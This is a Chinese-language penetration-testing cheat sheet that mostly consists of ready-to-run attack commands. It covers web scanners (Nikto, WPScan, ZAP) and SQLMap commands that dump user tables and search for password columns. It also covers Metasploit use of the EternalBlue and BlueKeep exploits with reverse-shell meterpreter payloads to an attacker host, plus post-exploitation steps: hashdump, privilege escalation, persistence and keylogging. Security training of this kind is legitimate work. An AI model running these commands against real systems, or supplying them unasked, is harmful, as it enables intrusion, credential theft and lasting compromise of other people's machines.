## 一、常见漏洞类型

### OWASP Top 10（2021）

```
1. 访问控制失效（Broken Access Control）
2. 加密失败（Cryptographic Failures）
3. 注入（Injection）
4. 不安全设计（Insecure Design）
5. 安全配置错误（Security Misconfiguration）
6. 敏感数据泄露（Sensitive Data Exposure）
7. 身份认证失效（Identification & Authentication Failures）
8. 软件与数据完整性失败（Software & Data Integrity Failures）
9. 日志与监控不足（Security Logging & Monitoring Failures）
10. 服务器端请求伪造 SSRF（Server-Side Request Forgery）
```

## 二、Web 漏洞扫描

### Burp Suite 使用

```bash
# 启动
sudo apt install burpsuite
# 或下载专业版（需授权）

# 基本配置：
# 1. 浏览器设置代理：127.0.0.1:8080
# 2. 安装 BurpSuite CA 证书（防止 HTTPS 拦截报错）
# 3. 开启 Intercept
# 4. Proxy → Options → 添加要拦截的规则

# 被动扫描（浏览网站时自动进行）
# Active Scan（主动扫描）
# 右键请求 → Do active scan → 选择扫描范围
```

### OWASP ZAP

```bash
# 启动
owasp-zap
# 或命令行模式
zap-baseline.py -t http://target.com -r report.html
```

### Nikto

```bash
# Web 服务器漏洞扫描
nikto -h http://target.com
nikto -h https://target.com -p 443
nikto -h http://target.com -o nikto_result.html -Format html

# 跳过 CDN 检测
nikto -h http://target.com -Tuning 1,2,3

# 参数说明：
# -Tuning 1: 文件
# -Tuning 2: 配置错误
# -Tuning 3: 信息泄露
```

### SQLMap

```bash
# 基本注入检测
sqlmap -u "http://target.com/product?id=1"

# 自动检测 + 获取数据库信息
sqlmap -u "http://target.com/product?id=1" --batch --dbs

# 列出所有表
sqlmap -u "http://target.com/product?id=1" --batch -D dbname --tables

# 获取数据
sqlmap -u "http://target.com/product?id=1" --batch -D dbname -T users --dump

# POST 请求注入
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# 搜索特定数据库名
sqlmap -u "http://target.com/product?id=1" --batch --search -C password

# Cookie 认证
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# 风险级别（3 为最高，可能有破坏性）
sqlmap -u "http://target.com/product?id=1" --risk=3
```

## 三、漏洞扫描器

### OpenVAS

```bash
# 安装
sudo apt install openvas
sudo gvm-setup

# 启动
sudo gvm-start

# 访问 Web 界面
# https://127.0.0.1:9392

# 创建扫描任务
# Tasks → New Task → 填写目标 IP → Start
```

### Nessus（需授权）

```bash
# 安装 Nessus
# https://www.tenable.com/products/nessus
sudo systemctl start nessusd

# 访问 Web 界面
# https://localhost:8834
```

### WPScan（WordPress 专用）

```bash
# WordPress 漏洞扫描
wpscan --url http://target.com
wpscan --url http://target.com --enumerate u      # 用户枚举
wpscan --url http://target.com --enumerate vp     # 漏洞插件
wpscan --url http://target.com --enumerate vt     # 漏洞主题
wpscan --url http://target.com --enumerate p     # 插件
wpscan --url http://target.com --api-token YOUR_TOKEN --plugins-detection aggressive
```

## 四、Metasploit 框架

### 基础使用

```bash
# 启动
msfconsole

# 帮助
help
msf6 > help search

# 搜索模块
msf6 > search type:exploit name:smb
msf6 > search cve:2021 name:windows

# 使用模块
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > show options
msf6 > set RHOSTS 192.168.1.100
msf6 > run

# 利用漏洞
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > exploit
```

### Meterpreter 会话

```bash
# Meterpreter 基本命令
meterpreter > sysinfo              # 系统信息
meterpreter > getuid               # 当前用户
meterpreter > pwd                 # 当前目录
meterpreter > cd /path            # 切换目录
meterpreter > ls                   # 列出文件
meterpreter > download file.txt    # 下载文件
meterpreter > upload shell.exe    # 上传文件

# 权限提升
meterpreter > getsystem            # 尝试提权
meterpreter > hashdump            # 获取密码哈希

# 持久化
meterpreter > run post/windows/manage/persistence

# 键盘记录
meterpreter > run post/windows/capture/keylog_recorder
```

## 五、常见漏洞利用

### MS17-010（永恒之蓝）

```bash
# 检测
msf6 > search ms17_010
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

# 利用（目标为 Windows 7/Server 2008）
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > exploit
```

### BlueKeep（CVE-2019-0708）

```bash
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > exploit
```
